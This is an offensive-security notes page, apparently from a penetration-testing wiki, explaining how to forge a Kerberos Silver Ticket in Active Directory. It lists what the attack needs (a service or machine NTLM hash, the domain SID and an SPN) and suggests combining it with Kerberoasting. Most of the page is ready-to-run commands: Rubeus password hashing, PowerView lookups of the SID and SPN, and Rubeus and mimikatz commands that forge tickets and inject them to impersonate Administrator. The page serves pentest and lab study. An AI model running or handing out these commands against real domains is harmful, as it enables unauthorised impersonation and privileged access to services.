# Silver Ticket

Fake TGS we make it to access on specific service

We can use it when we have NTLM Hash for Service account (MSSQL, HTTP)

{% hint style="success" %}
Merge it with **Kerberoasting** attack to get SPN service hash
{% endhint %}

**to do forged Silver Ticket we need to**

* **Password hash for the service Account**
* **Domain SID**
* **SPN**

**or we need to**

* **Machine's NTLM hash**
* **Domain SID**
* **Hostname of Computer**
* **user to impersonate**

{% hint style="success" %}
after you get password from Kerbroasting attack we will hash it using rubeus
{% endhint %}

```powershell
.\Rubeus hash /password:P@ssw0rd
```

![image.png](<../../../../.gitbook/assets/image (2).png>)

**then domains SID**

```powershell
get-DomainSID
```

**GET SPN**

```powershell
Get-DomainUser -Identity SQLSvc |select serviceprincipalname

setspn -l sqlsvc
```

Launch the attack

```powershell
.\Rubeus.exe silver /service:MSSQLSvc/pdc.wargrey.mon:1433 /rc4:E19CCF75EE54E06B06A5907AF13CEF42 /sid:S-1-5-21-2141828725-255675156-4058838521 /user:Administrator /domain:wargrey.mon /ptt

# or
mimikatz “kerberos::golden /admin:Admin /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit

# or
kerberos::golden /user:Administrator /rc4:e882c92024e683640c00ae83d43b5c88 /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /domain:dollarcorp.moneycorp.local /service:HOST /ptt
```
